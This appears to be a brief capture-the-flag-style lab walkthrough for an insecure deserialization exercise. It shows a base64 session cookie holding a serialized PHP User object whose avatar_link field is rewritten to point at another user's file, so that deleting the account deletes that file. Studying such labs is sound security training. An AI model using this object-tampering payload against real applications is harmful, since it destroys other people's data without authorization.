This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud



1) access as wiener:peter and see that the session cookie is a serialized object in base64
    O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"f3xpv38duhu0rmlmgtohnm0dtfr7kpnz";s:11:"avatar_link";s:23:"avatar/file...";}

2) so we want to delete morale.txt file of carlos, so we can change the avatar_link to point to /home/carlos/morale.txt
      O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"f3xpv38duhu0rmlmgtohnm0dtfr7kpnz";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

3) use it in base64 as session cookie and delete the user account of wiener and morale.txt file is deleted
